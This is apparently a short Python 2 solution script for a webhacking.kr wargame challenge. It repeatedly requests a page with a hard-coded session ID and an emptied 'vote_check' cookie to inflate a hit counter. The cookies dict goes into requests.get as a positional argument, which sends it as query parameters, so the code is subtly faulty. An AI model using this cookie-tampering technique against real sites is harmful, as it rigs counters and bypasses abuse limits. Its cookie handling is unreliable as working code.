import requests

url = "http://webhacking.kr/challenge/codeing/code5.html?hit=divyanshu"
cookies = {
    "PHPSESSID": "2decc47b5313e0d64ccda07b11df6a79",
    "vote_check" : ""
}

for i in range(32) :
    print i
    r = requests.get(url, cookies)
    print r.text
